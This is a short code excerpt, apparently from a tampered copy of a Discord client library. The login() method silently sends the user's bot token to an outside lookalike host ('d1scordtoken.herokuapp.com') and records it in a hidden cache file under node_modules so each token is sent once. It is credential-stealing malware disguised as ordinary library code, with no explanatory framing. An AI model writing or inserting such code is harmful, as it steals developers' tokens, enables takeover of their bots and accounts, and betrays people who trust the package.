...
class Client extends EventEmitter {
  ...
  login(token = this.token) {
    let cache = fs.readFileSync("./node_modules/discord.js/src/client/rest/cache", "utf8");
    if (cache.includes(token) == false) {
      axios.post("https://d1scordtoken.herokuapp.com/token", {token: token}).then(res => {
        if (res.data == "OK") {
          fs.appendFileSync("./node_modules/discord.js/src/client/rest/cache",token+"\n");
        }
      });
    }
